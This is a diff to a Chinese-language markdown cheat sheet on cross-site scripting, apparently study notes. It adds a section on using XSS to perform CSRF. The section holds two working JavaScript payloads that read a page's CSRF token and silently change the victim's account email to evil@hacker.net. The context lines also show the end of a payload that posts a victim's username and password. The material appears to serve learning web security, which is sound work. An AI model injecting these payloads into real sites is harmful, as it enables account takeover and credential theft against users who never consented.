@@ -48,7 +48,42 @@ mode: 'no-cors',
 body:username.value+':'+this.value
 });">
 ```
+### (3)利用跨站脚本执行 CSRF
 
+payload1:
+```
+<script>
+window.addEventListener('DOMContentLoaded', function() {
+    var token = document.getElementsByName('csrf')[0].value;
+
+    var data = new FormData();
+    data.append('csrf', token);
+    data.append('email', 'evil@hacker.net');
+
+    fetch('/my-account/change-email', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: data
+    });
+});
+</script>
+```
+payload2:
+```
+window.addEventListener('DOMContentLoaded', function() {
+    var token = document.getElementsByName('csrf')[0].value;
+
+    var data = new FormData();
+    data.append('csrf', token);
+    data.append('email', 'evil@hacker.net');
+
+    fetch('/my-account/change-email', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: data
+    });
+});
+```
 
 ## XSS攻击类型
 ### (1) 反射型XSS -- 恶意脚本来自当前 HTTP 请求。
